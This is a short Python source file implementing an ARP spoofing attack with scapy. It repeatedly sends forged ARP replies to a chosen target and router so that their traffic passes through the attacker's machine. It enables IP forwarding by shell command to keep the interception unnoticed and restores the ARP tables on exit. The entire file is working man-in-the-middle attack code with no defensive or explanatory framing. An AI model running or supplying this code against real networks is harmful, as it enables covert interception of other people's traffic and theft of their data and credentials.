import scapy.all as scapy
from files import Network_Scanner
import subprocess


class ARPSPOOF:
    def __init__(self, target_ip=None, router_ip=None, interface=None):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.interface = interface
        self.scanner = Network_Scanner.NetworkScanner()

    def spoof(self, target_ip, router_ip, mac):
        spoof_packet = scapy.ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=mac)
        scapy.send(spoof_packet, verbose=False)

    def restore_arp_table(self, target_ip, router_ip):
        target_mac = self.scanner.get_mac(target_ip, self.interface)
        router_mac = self.scanner.get_mac(router_ip, self.interface)
        restore_packet = scapy.ARP(op=2, pdst=target_ip, psrc=router_ip, hwsrc=router_mac, hwdst=target_mac)
        scapy.send(restore_packet, count=5, verbose=False)

    def run_attack(self):
        target_MAC = self.scanner.get_mac(self.target_ip, self.interface)
        router_MAC = self.scanner.get_mac(self.router_ip, self.interface)
        try:
            while True:
                self.spoof(self.target_ip, self.router_ip, target_MAC)
                self.spoof(self.router_ip, self.target_ip, router_MAC)
        except KeyboardInterrupt:
            self.restore_arp_table(self.target_ip, self.router_ip)
            self.restore_arp_table(self.router_ip, self.target_ip)

    def ip_forward(self):
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
